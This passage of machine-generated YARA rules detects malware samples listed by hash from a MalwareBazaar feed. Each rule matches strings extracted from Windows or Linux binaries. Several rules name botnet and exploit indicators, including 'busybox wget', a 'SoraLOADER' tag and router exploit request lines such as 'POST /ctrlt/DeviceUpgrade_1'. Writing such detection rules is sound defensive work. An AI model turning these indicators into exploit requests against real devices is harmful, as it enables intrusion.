        $s9 = "__wine_dbg_output"
        $s10 = "__wine_dbg_header"
        $s11 = "GetModuleHandleW"
        $s12 = "GetProcAddress"
        $s13 = "GetTickCount"
        $s14 = "_get_initial_wide_environment"
        $s15 = "_set_app_type"
        $s16 = "fwrite"
        $s17 = "getenv"
        $s18 = "kernel32.dll"
        $s19 = "ntdll.dll"
        $s20 = "ucrtbase.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 100KB and
        all of them
}

rule Windows_6465402b5a02aa817496718dadffa9885ac091c2b28029b25cda79630abbb45c
{
    meta:
        description = "Auto ML: 6465402b5a02aa817496718dadffa9885ac091c2b28029b25cda79630abbb45c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 456KB and
        all of them
}

rule Windows_64672e440233c0624ba97623be556888f354c3672b6623302be7f2f0e49a8d7b
{
    meta:
        description = "Auto ML: 64672e440233c0624ba97623be556888f354c3672b6623302be7f2f0e49a8d7b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "CloseHandle"
        $s5 = "ConnectNamedPipe"
        $s6 = "CreateFileA"
        $s7 = "CreateNamedPipeA"
        $s8 = "CreateThread"
        $s9 = "DeleteCriticalSection"
        $s10 = "GetCurrentProcess"
        $s11 = "GetCurrentProcessId"
        $s12 = "GetCurrentThreadId"
        $s13 = "GetLastError"
        $s14 = "GetModuleHandleA"
        $s15 = "GetProcAddress"
        $s16 = "GetStartupInfoA"
        $s17 = "GetSystemTimeAsFileTime"
        $s18 = "GetTickCount"
        $s19 = "ReadFile"
        $s20 = "SetUnhandledExceptionFilter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15KB and
        all of them
}

rule Linux_6489bd3ed75c7308f7b8c5d1da907c114b4d77d59b9b4c435720ee737b95f712
{
    meta:
        description = "Auto ML: 6489bd3ed75c7308f7b8c5d1da907c114b4d77d59b9b4c435720ee737b95f712"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/system"
        $s2 = "/ (deleted)"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s5 = "Windows XP"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB and
        all of them
}

rule Windows_648bec40870a8c3abce34fcf5924fcdb02601d7b5561aca406808649ff164a6d
{
    meta:
        description = "Auto ML: 648bec40870a8c3abce34fcf5924fcdb02601d7b5561aca406808649ff164a6d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 229KB and
        all of them
}

rule Windows_648db7c068add14dc5dc857c70840b44570ae14eeeaf179be5780a33a9d2d907
{
    meta:
        description = "Auto ML: 648db7c068add14dc5dc857c70840b44570ae14eeeaf179be5780a33a9d2d907"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "Delete"
        $s6 = "CorExitProcess"
        $s7 = "An application has made an attempt to load the C runtime library incorrectly."
        $s8 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s9 = "- Attempt to initialize the CRT more than once."
        $s10 = "- unable to open console device"
        $s11 = "- unexpected multithread lock error"
        $s12 = "- not enough space for thread data"
        $s13 = "- floating point support not loaded"
        $s14 = "FlsSetValue"
        $s15 = "FlsGetValue"
        $s16 = "Filename too long"
        $s17 = "Read-only file system"
        $s18 = "File too large"
        $s19 = "Too many open files"
        $s20 = "Too many open files in system"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1135KB and
        all of them
}

rule Windows_086f335efce2f5cc6171e0d707fa659e1db7b282195df9bf28c054a01337f8a1
{
    meta:
        description = "Auto ML: 086f335efce2f5cc6171e0d707fa659e1db7b282195df9bf28c054a01337f8a1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System"
        $s6 = "registryName"
        $s7 = "System.Threading"
        $s8 = "System.IO"
        $s9 = "FileInfo"
        $s10 = "currentAssemblyFileInfo"
        $s11 = "isConnected"
        $s12 = "System.Net.Sockets"
        $s13 = "tcpSocket"
        $s14 = "DeleteValueFromRegistry"
        $s15 = "GetValueFromRegistry"
        $s16 = "Microsoft.Win32"
        $s17 = "RegistryValueKind"
        $s18 = "SaveValueOnRegistry"
        $s19 = "GetInfo"
        $s20 = "GetForegroundWindowTitle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 32KB and
        all of them
}

rule Linux_64a71dcd27b0b121917720b2726f78c21bff7854635b1c7963df902aab407d30
{
    meta:
        description = "Auto ML: 64a71dcd27b0b121917720b2726f78c21bff7854635b1c7963df902aab407d30"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "processor"
        $s5 = "/sys/devices/system/cpu"
        $s6 = "_Unwind_VRS_Get"
        $s7 = "_Unwind_VRS_Set"
        $s8 = "_Unwind_GetCFA"
        $s9 = "_Unwind_Complete"
        $s10 = "_Unwind_DeleteException"
        $s11 = "_Unwind_GetTextRelBase"
        $s12 = "_Unwind_GetDataRelBase"
        $s13 = "__gnu_Unwind_ForcedUnwind"
        $s14 = "__gnu_Unwind_Resume"
        $s15 = "__gnu_Unwind_RaiseException"
        $s16 = "__gnu_Unwind_Resume_or_Rethrow"
        $s17 = "_Unwind_VRS_Pop"
        $s18 = "__aeabi_unwind_cpp_pr2"
        $s19 = "__aeabi_unwind_cpp_pr1"
        $s20 = "__aeabi_unwind_cpp_pr0"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 150KB and
        all of them
}

rule Windows_64c5b70529dcba8b234148587332b0dbde7f8ab5f4c0b34b7740bdfdc1ba04c8
{
    meta:
        description = "Auto ML: 64c5b70529dcba8b234148587332b0dbde7f8ab5f4c0b34b7740bdfdc1ba04c8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "AreaDAL"
        $s6 = "System.IO"
        $s7 = "ReadArea"
        $s8 = "System.Data"
        $s9 = "System.Collections.Generic"
        $s10 = "Read"
        $s11 = "Form1_Load"
        $s12 = "add_Load"
        $s13 = "CreateInstance"
        $s14 = "set_AutoScaleMode"
        $s15 = "set_SizeMode"
        $s16 = "set_ColumnHeadersHeightSizeMode"
        $s17 = "set_Image"
        $s18 = "GetTypeFromHandle"
        $s19 = "get_Title"
        $s20 = "get_AssemblyTitle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 654KB and
        all of them
}

rule Linux_64ce40182934176edcf9fa7f97507ead52d5da9a9a5f35be2f6a67344d3e9bcd
{
    meta:
        description = "Auto ML: 64ce40182934176edcf9fa7f97507ead52d5da9a9a5f35be2f6a67344d3e9bcd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "User-Ag"
        $s2 = "0vGET"
        $s3 = "http"
        $s4 = "_FILELCKgkf"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 42KB and
        all of them
}

rule Windows_65002ea8e5b2e260c24fc287a5c0a39f271f666b4d2087d3f549cf71397abdb9
{
    meta:
        description = "Auto ML: 65002ea8e5b2e260c24fc287a5c0a39f271f666b4d2087d3f549cf71397abdb9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "`local static thread guard'"
        $s18 = "`placement delete[] closure'"
        $s19 = "`placement delete closure'"
        $s20 = "delete[]"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 286KB and
        all of them
}

rule Linux_652b0786d3823c81a6c94a6696e7685ba3b373f0d662e3b2fc4a7ee4c0d3ca37
{
    meta:
        description = "Auto ML: 652b0786d3823c81a6c94a6696e7685ba3b373f0d662e3b2fc4a7ee4c0d3ca37"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "bin/systemd"
        $s7 = "/bin/systemd"
        $s8 = "GET /%s HTTP/1.0"
        $s9 = "User-Agent: Update v1.0"
        $s10 = "No such file or directory"
        $s11 = "No such process"
        $s12 = "Interrupted system call"
        $s13 = "Bad file descriptor"
        $s14 = "No child processes"
        $s15 = "Resource temporarily unavailable"
        $s16 = "File exists"
        $s17 = "Too many open files in system"
        $s18 = "Too many open files"
        $s19 = "Text file busy"
        $s20 = "File too large"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 78KB and
        all of them
}

rule Windows_6534b09aaf207abaa69df8a5065e0f098f24d547542e6581e52b04d33d276c82
{
    meta:
        description = "Auto ML: 6534b09aaf207abaa69df8a5065e0f098f24d547542e6581e52b04d33d276c82"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB and
        all of them
}

rule Windows_6580ee7e9fe73274559250783c06a7805723663d8c3fd73c63acc9d3f4803491
{
    meta:
        description = "Auto ML: 6580ee7e9fe73274559250783c06a7805723663d8c3fd73c63acc9d3f4803491"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "P.Order -231211.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "ExporterVisitorConnector"
        $s8 = "P.Order-231211.Connections"
        $s9 = "CtlCmd"
        $s10 = "<Module>{fc4faf08-add1-4747-bafe-3f785ed8cfaa}"
        $s11 = "System.Reflection"
        $s12 = "System.Reflection.Emit"
        $s13 = "GetMethod"
        $s14 = "DefineDynamicModule"
        $s15 = "ModuleBuilder"
        $s16 = "GetILGenerator"
        $s17 = "GetExportedTypes"
        $s18 = "System.Linq"
        $s19 = "System.Core"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 695KB and
        all of them
}

rule Linux_658ae1fc3bb053631cdae5cd3c443a7dc76688909a3f6e1bb1f928e734f5afc9
{
    meta:
        description = "Auto ML: 658ae1fc3bb053631cdae5cd3c443a7dc76688909a3f6e1bb1f928e734f5afc9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "/proc/%d/cmdline"
        $s7 = "wget"
        $s8 = "/usr/lib/systemd/systemd"
        $s9 = "/usr/libexec/openssh/sftp-server"
        $s10 = "shell"
        $s11 = "httpd"
        $s12 = "system"
        $s13 = "GET /%s HTTP/1.0"
        $s14 = "User-Agent: Update v1.0"
        $s15 = "No such file or directory"
        $s16 = "No such process"
        $s17 = "Interrupted system call"
        $s18 = "Bad file descriptor"
        $s19 = "No child processes"
        $s20 = "Resource temporarily unavailable"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 131KB and
        all of them
}

rule Windows_65d59cc441cd33c09cc1d83f3097da96414b23480d94ee0bf74477aa0f012588
{
    meta:
        description = "Auto ML: 65d59cc441cd33c09cc1d83f3097da96414b23480d94ee0bf74477aa0f012588"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Core"
        $s10 = "System.Diagnostics"
        $s11 = "<Module>"
        $s12 = "System.IO"
        $s13 = "<Module>{D918C633-1D55-4A4A-A483-97AAB9736658}"
        $s14 = "jn7XVnGmM4lMlCMDGTc"
        $s15 = "System.Text"
        $s16 = "get_Length"
        $s17 = "get_Chars"
        $s18 = "System.Collections.Generic"
        $s19 = "System.Linq"
        $s20 = "GetEnumerator"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1564KB and
        all of them
}

rule Linux_65d6c45c5597e86540162e9f0cdc3359e80f930c830eeea510b52d96173d88ea
{
    meta:
        description = "Auto ML: 65d6c45c5597e86540162e9f0cdc3359e80f930c830eeea510b52d96173d88ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 135KB and
        all of them
}

rule Windows_00ca497ab0c4a5512a229bc533d71354bf2ef6736154b7f80a631bf50a353ef6
{
    meta:
        description = "Auto ML: 00ca497ab0c4a5512a229bc533d71354bf2ef6736154b7f80a631bf50a353ef6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2992KB and
        all of them
}

rule Linux_0880b43e49128113de2b0b65824c6289a9319e1308fddd125eb5fd30fe1f9778
{
    meta:
        description = "Auto ML: 0880b43e49128113de2b0b65824c6289a9319e1308fddd125eb5fd30fe1f9778"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 163KB and
        all of them
}

rule Windows_65d7365f70305fab7e31aa83c9fa0eab041f4a1c29f04c0e6a1fd43c88f64de9
{
    meta:
        description = "Auto ML: 65d7365f70305fab7e31aa83c9fa0eab041f4a1c29f04c0e6a1fd43c88f64de9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
        $s3 = "CoCreateInstance"
        $s4 = "DeleteUrlCacheEntry"
        $s5 = "ExitProcess"
        $s6 = "GetCommandLineA"
        $s7 = "GetComputerNameA"
        $s8 = "GetCurrentProcessId"
        $s9 = "GetCurrentThreadId"
        $s10 = "GetExitCodeThread"
        $s11 = "GetFileSize"
        $s12 = "GetModuleFileNameA"
        $s13 = "GetModuleHandleA"
        $s14 = "CloseHandle"
        $s15 = "GetProcAddress"
        $s16 = "GetSystemDirectoryA"
        $s17 = "GetTempPathA"
        $s18 = "GetTickCount"
        $s19 = "GetVersion"
        $s20 = "GetVersionExA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 338KB and
        all of them
}

rule Windows_66050765be8e3bca709568c2a3e249cd904336a9ed0f7d3ace407f43e7c4501a
{
    meta:
        description = "Auto ML: 66050765be8e3bca709568c2a3e249cd904336a9ed0f7d3ace407f43e7c4501a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System.Core"
        $s7 = "TargetFrameworkAttribute"
        $s8 = "System.Runtime.Versioning"
        $s9 = "System.Runtime.InteropServices"
        $s10 = "System.Diagnostics"
        $s11 = "<Module>"
        $s12 = "System.IO"
        $s13 = "O7K0H5KbjGqJSETWfta"
        $s14 = "<Module>{ECBB8D6E-93C8-44DD-866B-A92D8F339D4A}"
        $s15 = "<Module>{d66abd70-1fa3-452b-92b4-57126b1c59e4}"
        $s16 = "vk48wH9XWINu5uEu26tm"
        $s17 = "E6GYRW9MdJlhTtp8N1lq"
        $s18 = "l8byTf9tiXQwIN2LpufL"
        $s19 = "System.Text"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1954KB and
        all of them
}

rule Windows_660d37a0667f9df27e662aa2ad6d228a1f73c54ed72db00ace1b8cd8902f5077
{
    meta:
        description = "Auto ML: 660d37a0667f9df27e662aa2ad6d228a1f73c54ed72db00ace1b8cd8902f5077"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4708KB and
        all of them
}

rule Linux_66141a438dd5b17117400a2f075e8710575c652368493c5d2bb4a9c38cba17d1
{
    meta:
        description = "Auto ML: 66141a438dd5b17117400a2f075e8710575c652368493c5d2bb4a9c38cba17d1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB and
        all of them
}

rule Linux_663612d085e1720a68b9859324d90c179087b282d52bc6011c2c0556a03ea817
{
    meta:
        description = "Auto ML: 663612d085e1720a68b9859324d90c179087b282d52bc6011c2c0556a03ea817"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = ".text"
        $s4 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 54KB and
        all of them
}

rule Windows_663d26dcbb8d892f986086c207e27519f16c23846c1c905c3412c3adef674b8d
{
    meta:
        description = "Auto ML: 663d26dcbb8d892f986086c207e27519f16c23846c1c905c3412c3adef674b8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "Software\\Microsoft\\Windows\\CurrentVersion"
        $s6 = "DeleteFileA"
        $s7 = "FindFirstFileA"
        $s8 = "FindNextFileA"
        $s9 = "FindClose"
        $s10 = "SetFilePointer"
        $s11 = "ReadFile"
        $s12 = "WriteFile"
        $s13 = "GetPrivateProfileStringA"
        $s14 = "WritePrivateProfileStringA"
        $s15 = "LoadLibraryExA"
        $s16 = "GetModuleHandleA"
        $s17 = "GetExitCodeProcess"
        $s18 = "CloseHandle"
        $s19 = "SetFileTime"
        $s20 = "CompareFileTime"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1161KB and
        all of them
}

rule Windows_66694f7dcb467cd242471f76c58bc236c458761d22bcb4682a07605e0d7bd384
{
    meta:
        description = "Auto ML: 66694f7dcb467cd242471f76c58bc236c458761d22bcb4682a07605e0d7bd384"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2419KB and
        all of them
}

rule Windows_667ade680488ead36e7e6cd112f953212c964c0dcbef2fe88923811df818e161
{
    meta:
        description = "Auto ML: 667ade680488ead36e7e6cd112f953212c964c0dcbef2fe88923811df818e161"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1291KB and
        all of them
}

rule Windows_669634a33853f70175e367b9519b29e5ac57ddeb412884c004875344ad2b5165
{
    meta:
        description = "Auto ML: 669634a33853f70175e367b9519b29e5ac57ddeb412884c004875344ad2b5165"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System.Core"
        $s7 = "System.Diagnostics"
        $s8 = "TargetFrameworkAttribute"
        $s9 = "System.Runtime.Versioning"
        $s10 = "System.Runtime.InteropServices"
        $s11 = "<Module>"
        $s12 = "System.IO"
        $s13 = "SMSEtPoiXd6jmda6QSq"
        $s14 = "<Module>{C0A2D593-55E3-4072-A218-CAA55DEAF648}"
        $s15 = "get_Chars"
        $s16 = "get_Length"
        $s17 = "System.Collections.Generic"
        $s18 = "get_Current"
        $s19 = "GetEnumerator"
        $s20 = "System.Globalization"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1497KB and
        all of them
}

rule Windows_66b79b9bbc034503f2c6330157047506b561d119031d0dd9d03ff87153e01ec5
{
    meta:
        description = "Auto ML: 66b79b9bbc034503f2c6330157047506b561d119031d0dd9d03ff87153e01ec5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
